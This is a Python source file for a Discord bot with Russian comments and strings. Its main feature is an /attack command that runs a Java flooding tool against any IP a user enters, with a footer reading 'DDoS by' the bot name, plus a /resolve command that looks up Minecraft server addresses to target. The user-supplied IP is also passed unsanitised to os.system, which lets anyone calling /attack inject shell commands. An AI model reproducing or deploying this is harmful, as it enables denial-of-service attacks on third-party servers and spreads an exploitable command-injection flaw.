import discord
import os
import threading
import urllib.request
import json
import asyncio
import config

from discord.ext import commands

bot = discord.Bot() # для slash команд
botname = config.BOT
discordlink = config.DISCORD
testingservers = config.GUILDS # мой тестовый сервер, поменяй на свой, можно выделить несколько, если их несколько.


def attack_server(ip):
    os.system("java -jar ping.jar {}".format(ip))

@bot.event
async def on_ready():
    print("Bot started: {0.user}".format(bot))
    while True:
        await bot.change_presence(activity=discord.Game(name=discordlink))
        await asyncio.sleep(10.0)
        await bot.change_presence(activity=discord.Game(name="/attack - атака!"))
        await asyncio.sleep(10.0)
        await bot.change_presence(activity=discord.Game(name="/credits - инфа!"))


@bot.slash_command(guild_ids = testingservers, name = "credits", description = "Информация о создателе!")
@commands.cooldown(1, 60, commands.BucketType.user)
async def credits(ctx):
    embed = discord.Embed(
        title='Информация о создателе!',
        description=f'Надо проинформаровать {ctx.author.mention}!',
        color=discord.Colour.red()
    )
    embed.add_field(name='➦ Создатель', value ='<@731428949665513572>', inline=False)
    embed.add_field(name='➦ Кодер', value ='<@967316503651315782>', inline=False)
    embed.add_field(name='➦ Создание', value ='Создна на Python, с кофейком и с любовью<3', inline=False)
    embed.set_image(url='https://i.gifer.com/origin/e9/e9329b236da049a682773a98868ba2c1.gif')
    await ctx.respond(embed=embed)

@bot.slash_command(guild_ids = testingservers, name = "reload", description = "Перезагрузка!")
@commands.has_permissions(administrator=True)
async def reload(ctx):
    try:
        await ctx.respond(f'Бот перезапущен!\n\n Ждёт работаспособности! ')
        os.system(f'python bot.py')
    except:
        await ctx.respond("Бот умер, перезапустите пожалуйта!")

@bot.slash_command(guild_ids = testingservers, name = "clear", description = "Очистить сообщения!")
@commands.has_permissions(manage_messages=True)
async def clear(ctx, limit: int):
        await ctx.channel.purge(limit=limit)
        embed1 = discord.Embed(title = "Очистка...", description=f"канал был очищен от {limit} сообщения от {ctx.author.mention}",color = discord.Color.from_rgb(255,0,0  ))
        await ctx.respond(embed=embed1, delete_after=10)
        await ctx.message.delete()

@bot.slash_command(guild_ids = testingservers, name = "attack", description = "Атака сервера!")
@commands.cooldown(1, 60, commands.BucketType.user)
async def attack(ctx, ip):
    def attack_start():
       thread = threading.Thread(target=attack_server, args=(ip,))
       thread.setDaemon(True)
       thread.start()
    attack_start()
    embed = discord.Embed(
        title='Начала атаки...',
        description=f'Атака от {ctx.author.mention}',
        color=discord.Colour.red()
    )
    embed.add_field(name='Айпи сервера:', value="{}".format(ip), inline=False)
    embed.set_image(url=config.ATTACK_GIF)
    embed.set_footer(text="DDoS by " + botname)
    await ctx.respond(embed=embed)

@bot.slash_command(guild_ids = testingservers, name = "resolve", description = "Узнать айпи сервера!")
@commands.cooldown(1, 60, commands.BucketType.user)
async def resolve(ctx, server):
    url = "https://api.mcsrvstat.us/2/" + server
    file = urllib.request.urlopen(url)

    for line in file:
        decoded_line = line.decode("utf-8")

    json_object = json.loads(decoded_line)

    embed = discord.Embed(
        title="Решено!",
        color=discord.Colour.red()
    )

    embed.add_field(name='Айпи:', value=json_object["ip"], inline=False)
    embed.add_field(name='Порт:', value=json_object["port"], inline=False)
    embed.add_field(name="Имя хоста", value=json_object["hostname"], inline=False)
    embed.add_field(name="Версия:", value=json_object["version"], inline=False)
    embed.add_field(name="Игроков:", value=json_object["players"], inline=False)
    embed.add_field(name="Сервер онлайн:", value=json_object["online"], inline=False)

    g = json_object["ip"]
    gb = json_object["port"]

    embed.set_image(url=f'http://status.mclive.eu/{botname}/{g}/{gb}/banner.png')
    embed.set_footer(text=botname)
    await ctx.respond(embed=embed)

bot.run(config.TOKEN)
